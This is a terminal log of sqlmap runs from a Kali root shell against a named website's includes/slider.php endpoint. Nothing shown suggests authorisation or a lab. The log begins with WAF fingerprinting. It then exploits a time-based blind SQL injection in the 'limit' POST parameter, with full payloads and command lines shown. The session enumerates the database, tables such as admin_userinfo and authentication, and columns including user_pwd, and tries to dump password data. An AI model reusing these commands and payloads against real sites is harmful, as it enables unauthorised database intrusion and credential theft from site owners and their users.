[16:28:32] [DEBUG] checking for WAF/IPS product 'Zenedge Web Application Firewall (Zenedge)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'UTM Web Protection (Sophos)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Yundun Web Application Firewall (Yundun)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'BIG-IP Application Security Manager (F5 Networks)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Incapsula Web Application Firewall (Incapsula/Imperva)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Proventia Web Application Security (IBM)'
[16:28:32] [DEBUG] declared web page charset 'iso-8859-1'
[16:28:32] [DEBUG] page not found (404)
[16:28:32] [DEBUG] checking for WAF/IPS product 'Wallarm Web Application Firewall (Wallarm)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'ISA Server (Microsoft)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'UrlScan (Microsoft)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Yunsuo Web Application Firewall (Yunsuo)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'CrawlProtect (Jean-Denis Brun)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Safe3 Web Application Firewall'
[16:28:32] [DEBUG] checking for WAF/IPS product 'ExpressionEngine (EllisLab)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'WebKnight Application Firewall (AQTRONIX)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'AppWall (Radware)'
[16:28:32] [DEBUG] checking for WAF/IPS product '360 Web Application Firewall (360)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Newdefend Web Application Firewall (Newdefend)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'webApp.secure (webScurity)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Barracuda Web Application Firewall (Barracuda Networks)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Varnish FireWall (OWASP)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'ASP.NET RequestValidationMode (Microsoft)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Tencent Cloud Web Application Firewall (Tencent Cloud Computing)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'BinarySEC Web Application Firewall (BinarySEC)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'WatchGuard (WatchGuard Technologies)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'CloudFront (Amazon)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'KS-WAF (Knownsec)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Jiasule Web Application Firewall (Jiasule)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'BlockDoS'
[16:28:32] [DEBUG] checking for WAF/IPS product 'IBM WebSphere DataPower (IBM)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Wordfence (Feedjit)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Armor Protection (Armor Defense)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Deny All Web Application Firewall (DenyAll)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'EdgeCast Web Application Firewall (Verizon)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Palo Alto Firewall (Palo Alto Networks)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Stingray Application Firewall (Riverbed / Brocade)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Anquanbao Web Application Firewall (Anquanbao)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Cisco ACE XML Gateway (Cisco Systems)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'FortiWeb Web Application Firewall (Fortinet)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Airlock (Phion/Ergon)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'KONA Security Solutions (Akamai Technologies)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'TrafficShield (F5 Networks)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'DOSarrest (DOSarrest Internet Security)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Hyperguard Web Application Firewall (art of defence)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'NSFOCUS Web Application Firewall (NSFOCUS)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'SEnginx (Neusoft Corporation)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Safedog Web Application Firewall (Safedog)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'CloudProxy WebSite Firewall (Sucuri)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'aeSecure (aeSecure)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'SonicWALL (Dell)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'TrueShield Web Application Firewall (SiteLock)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'SecureIIS Web Server Security (BeyondTrust)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'NAXSI (NBS System)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Distil Web Application Firewall Security (Distil Networks)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Reblaze Web Application Firewall (Reblaze)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'NetScaler (Citrix Systems)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Yunjiasu Web Application Firewall (Baidu)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Generic (Unknown)'
[16:28:32] [WARNING] WAF/IPS product hasn't been identified
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
    Vector: PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)
---
[16:28:32] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[16:28:32] [INFO] fetching database names
[16:28:32] [INFO] fetching number of databases
[16:28:32] [PAYLOAD] 13 PROCEDURE ANALYSE(EXTRACTVALUE(7217,CONCAT(0x5c,(IF((ORD(MID((SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>51),BENCHMARK(5000000,MD5(0x45506e79)),7217)))),1)
[16:28:32] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[16:28:40] [PAYLOAD] 13 PROCEDURE ANALYSE(EXTRACTVALUE(7217,CONCAT(0x5c,(IF((ORD(MID((SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>48),BENCHMARK(5000000,MD5(0x45506e79)),7217)))),1)
[16:28:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[16:28:41] [PAYLOAD] 13 PROCEDURE ANALYSE(EXTRACTVALUE(7217,CONCAT(0x5c,(IF((ORD(MID((SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>9),BENCHMARK(5000000,MD5(0x45506e79)),7217)))),1)
[16:28:41] [INFO] retrieved: 
[16:28:41] [DEBUG] performed 3 queries in 8.35 seconds
[16:28:41] [ERROR] unable to retrieve the number of databases
[16:28:41] [INFO] falling back to current database
[16:28:41] [INFO] fetching current database
[16:28:41] [PAYLOAD] 13 PROCEDURE ANALYSE(EXTRACTVALUE(4834,CONCAT(0x5c,(IF((ORD(MID((DATABASE()),1,1))>64),BENCHMARK(5000000,MD5(0x53746469)),4834)))),1)
[16:28:41] [PAYLOAD] 13 PROCEDURE ANALYSE(EXTRACTVALUE(4834,CONCAT(0x5c,(IF((ORD(MID((DATABASE()),1,1))>32),BENCHMARK(5000000,MD5(0x53746469)),4834)))),1)
[16:28:41] [PAYLOAD] 13 PROCEDURE ANALYSE(EXTRACTVALUE(4834,CONCAT(0x5c,(IF((ORD(MID((DATABASE()),1,1))>1),BENCHMARK(5000000,MD5(0x53746469)),4834)))),1)
[16:28:42] [INFO] retrieved: 
[16:28:42] [DEBUG] performed 3 queries in 0.77 seconds
[16:28:42] [CRITICAL] unable to retrieve the database names
[16:28:42] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times
[16:28:42] [DEBUG] too many 4xx and/or 5xx HTTP error codes could mean that some kind of protection is involved (e.g. WAF)

[*] shutting down at 16:28:42

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --dbs --no-cast --tamper
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

Usage: python sqlmap [options]

sqlmap: error: --tamper option requires an argument
root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --dbs --no-cast --tamper between.py
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.10#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:29:19

[16:29:19] [INFO] loading tamper module 'between'
[16:29:20] [INFO] resuming back-end DBMS 'mysql' 
[16:29:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[16:29:20] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[16:29:20] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[16:29:20] [INFO] fetching database names
[16:29:20] [INFO] fetching number of databases
[16:29:20] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[16:29:29] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[16:29:29] [ERROR] unable to retrieve the number of databases
[16:29:29] [INFO] falling back to current database
[16:29:29] [INFO] fetching current database
[16:29:29] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[16:29:41] [INFO] adjusting time delay to 2 seconds due to good response times
qaisare_com
available databases [1]:
[*] qaisare_com

[16:30:25] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 16:30:25

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:30:54

[16:30:54] [INFO] loading tamper module 'between'
[16:30:54] [INFO] resuming back-end DBMS 'mysql' 
[16:30:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[16:30:55] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[16:30:55] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[16:30:55] [INFO] fetching tables for database: 'qaisare_com'
[16:30:55] [INFO] fetching number of tables for database 'qaisare_com'
[16:30:55] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[16:31:03] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[16:31:03] [WARNING] unable to retrieve the number of tables for database 'qaisare_com'
[16:31:03] [ERROR] unable to retrieve the table names for any database
do you want to use common table existence check? [y/N/q] y
[16:31:05] [WARNING] it's not recommended to use 'AND/OR time-based blind' and/or 'stacked queries' for common table existence check
are you sure you want to continue? [y/N] y
which common tables (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/txt/common-tables.txt' (press Enter)
[2] custom
> 1
[16:31:09] [INFO] checking table existence using items from '/usr/share/sqlmap/txt/common-tables.txt'
[16:31:09] [INFO] adding words used on web page to the check list
[16:31:39] [INFO] tried 117/3311 items (4%)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[16:31:48] [INFO] retrieved: EMPLOYEE                                                            
[16:34:36] [INFO] retrieved: aggtest                                                             
[16:34:51] [INFO] tried 826/3311 items (25%)

[16:34:52] [INFO] adjusting time delay to 1 second due to good response times
[16:34:52] [INFO] retrieved: idioma                                                              
[16:34:52] [INFO] retrieved: dtb_campaign_detail                                                 
[16:34:53] [INFO] retrieved: jos_components                                                      
[16:34:53] [INFO] retrieved: user_rights                                                         
[16:34:54] [INFO] retrieved: tf_messages                                                         
[16:34:54] [INFO] retrieved: Class_Def_Table                                                     
[16:35:51] [INFO] retrieved: journal                                                             
[16:36:41] [INFO] retrieved: ike_configs                                                         
[16:36:48] [INFO] retrieved: forum_cat                                                           
[16:37:30] [INFO] retrieved: dtb_bat_order_daily_hour                                            
[16:37:46] [INFO] retrieved: R1Sum                                                               
[16:38:15] [INFO] retrieved: shipping                                                            
[16:38:57] [INFO] retrieved: admin_userinfo                                                      
[16:39:15] [INFO] retrieved: mb_users                                                            
[16:40:11] [INFO] retrieved: authentication                                                      
[16:40:55] [INFO] retrieved: tblnews                                                             
[16:41:08] [INFO] retrieved: Bilder                                                              
[16:41:17] [INFO] retrieved: webapps                                                             
[16:42:38] [INFO] tried 2594/3311 items (78%)

[16:42:57] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[16:42:57] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[16:42:58] [INFO] retrieved: nuke_bbsearch_results                                               
[16:43:06] [INFO] tried 2619/3311 items (79%)


[16:44:05] [ERROR] thread MainThread: can't establish SSL connection
                                                                                                 
Database: qaisare_com
[21 tables]
+--------------------------+
| Bilder                   |
| Class_Def_Table          |
| EMPLOYEE                 |
| R1Sum                    |
| admin_userinfo           |
| aggtest                  |
| authentication           |
| dtb_bat_order_daily_hour |
| dtb_campaign_detail      |
| forum_cat                |
| idioma                   |
| ike_configs              |
| jos_components           |
| journal                  |
| mb_users                 |
| nuke_bbsearch_results    |
| shipping                 |
| tblnews                  |
| tf_messages              |
| user_rights              |
| webapps                  |
+--------------------------+

[16:44:05] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 16:44:05

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo --columns
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.10#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:44:26

[16:44:26] [INFO] loading tamper module 'between'
[16:44:26] [INFO] resuming back-end DBMS 'mysql' 
[16:44:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[16:44:27] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[16:44:27] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[16:44:27] [INFO] fetching columns for table 'admin_userinfo' in database 'qaisare_com'
[16:44:27] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[16:44:35] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[16:44:35] [ERROR] unable to retrieve the number of columns for table 'admin_userinfo' in database 'qaisare_com'
[16:44:35] [WARNING] unable to retrieve column names for table 'admin_userinfo' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] y
[16:44:37] [WARNING] it's not recommended to use 'AND/OR time-based blind' and/or 'stacked queries' for common column existence check
are you sure you want to continue? [y/N] y
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[16:44:40] [INFO] checking column existence using items from '/usr/share/sqlmap/txt/common-columns.txt'
[16:44:40] [INFO] adding words used on web page to the check list
[16:45:05] [INFO] tried 94/2499 items (4%)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[16:45:15] [INFO] retrieved: keyword                                                             
[16:45:30] [INFO] retrieved: channel                                                             
[16:45:41] [INFO] tried 194/2499 items (8%)

[16:45:42] [INFO] adjusting time delay to 1 second due to good response times
[16:45:42] [INFO] retrieved: student_number                                                      
[16:47:24] [INFO] retrieved: user_pwd                                                            
[16:48:50] [INFO] retrieved: fre_disciplina                                                      
[16:49:34] [INFO] retrieved: sitepref_name                                                       
[16:51:43] [INFO] retrieved: bst_time                                                            
[16:52:04] [INFO] retrieved: page_name                                                           
[16:53:03] [INFO] retrieved: can_codice                                                          
[16:53:06] [INFO] retrieved: mod_freeway_services                                                
[16:53:56] [INFO] retrieved: pff_id                                                              
[16:54:37] [INFO] retrieved: anelli                                                              
[16:55:14] [INFO] retrieved: postcount                                                           
                                                                                                 
Database: qaisare_com
Table: admin_userinfo
[13 columns]
+----------------------+---------+
| Column               | Type    |
+----------------------+---------+
| anelli               | numeric |
| bst_time             | numeric |
| can_codice           | numeric |
| channel              | numeric |
| fre_disciplina       | numeric |
| keyword              | numeric |
| mod_freeway_services | numeric |
| page_name            | numeric |
| pff_id               | numeric |
| postcount            | numeric |
| sitepref_name        | numeric |
| student_number       | numeric |
| user_pwd             | numeric |
+----------------------+---------+

[16:55:43] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 16:55:43

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo -C user_pwd --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:01:12

[17:01:12] [INFO] loading tamper module 'between'
[17:01:12] [INFO] resuming back-end DBMS 'mysql' 
[17:01:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[17:01:12] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[17:01:12] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[17:01:12] [INFO] fetching entries of column(s) 'user_pwd' for table 'admin_userinfo' in database 'qaisare_com'
[17:01:12] [INFO] fetching number of column(s) 'user_pwd' entries for table 'admin_userinfo' in database 'qaisare_com'
[17:01:12] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[17:01:20] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[17:01:21] [WARNING] unable to retrieve the number of column(s) 'user_pwd' entries for table 'admin_userinfo' in database 'qaisare_com'
[17:01:21] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 17:01:21

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo -C user_pwd --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:05:43

[17:05:43] [INFO] loading tamper module 'between'
[17:05:43] [INFO] resuming back-end DBMS 'mysql' 
[17:05:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[17:05:43] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[17:05:43] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[17:05:43] [INFO] fetching entries of column(s) 'user_pwd' for table 'admin_userinfo' in database 'qaisare_com'
[17:05:43] [INFO] fetching number of column(s) 'user_pwd' entries for table 'admin_userinfo' in database 'qaisare_com'
[17:05:43] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[17:05:51] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[17:05:52] [WARNING] unable to retrieve the number of column(s) 'user_pwd' entries for table 'admin_userinfo' in database 'qaisare_com'
[17:05:52] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 17:05:52

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo -C user_pwd --dump --time-sec
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

Usage: python sqlmap [options]

sqlmap: error: --time-sec option requires an argument
root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo -C user_pwd --dump --time-sec 100
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:06:20

[17:06:20] [INFO] loading tamper module 'between'
[17:06:20] [INFO] resuming back-end DBMS 'mysql' 
[17:06:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(100000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[17:06:20] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[17:06:20] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[17:06:20] [INFO] fetching entries of column(s) 'user_pwd' for table 'admin_userinfo' in database 'qaisare_com'
[17:06:20] [INFO] fetching number of column(s) 'user_pwd' entries for table 'admin_userinfo' in database 'qaisare_com'
[17:06:20] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[17:06:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[17:06:29] [WARNING] unable to retrieve the number of column(s) 'user_pwd' entries for table 'admin_userinfo' in database 'qaisare_com'
[17:06:29] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 17:06:29

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.10#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:17:49

[17:17:49] [INFO] loading tamper module 'between'
[17:17:49] [INFO] resuming back-end DBMS 'mysql' 
[17:17:49] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[17:17:49] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[17:17:49] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[17:17:49] [INFO] fetching tables for database: 'qaisare_com'
[17:17:49] [INFO] fetching number of tables for database 'qaisare_com'
[17:17:49] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[17:17:57] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[17:17:58] [WARNING] unable to retrieve the number of tables for database 'qaisare_com'
[17:17:58] [ERROR] unable to retrieve the table names for any database
[17:17:58] [INFO] fetching columns for table 'EMPLOYEE' in database 'qaisare_com'
[17:17:58] [INFO] retrieved: 
[17:17:59] [ERROR] unable to retrieve the number of columns for table 'EMPLOYEE' in database 'qaisare_com'
[17:17:59] [WARNING] unable to retrieve column names for table 'EMPLOYEE' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] y
[17:18:23] [WARNING] it's not recommended to use 'AND/OR time-based blind' and/or 'stacked queries' for common column existence check
are you sure you want to continue? [y/N] y
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[17:18:25] [INFO] checking column existence using items from '/usr/share/sqlmap/txt/common-columns.txt'
[17:18:25] [INFO] adding words used on web page to the check list
[17:20:22] [INFO] tried 459/2499 items (18%)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[17:26:53] [INFO] retrieved: mgrssn                                                              
[17:29:01] [INFO] retrieved: xencerramento                                                       
[17:29:29] [INFO] tried 1070/2499 items (43%)

[17:29:32] [INFO] adjusting time delay to 1 second due to good response times
[17:29:32] [INFO] retrieved: xsituacao                                                           
[17:29:35] [INFO] retrieved: site                                                                
[17:31:12] [INFO] retrieved: am_id                                                               
[17:31:17] [INFO] retrieved: udal                                                                
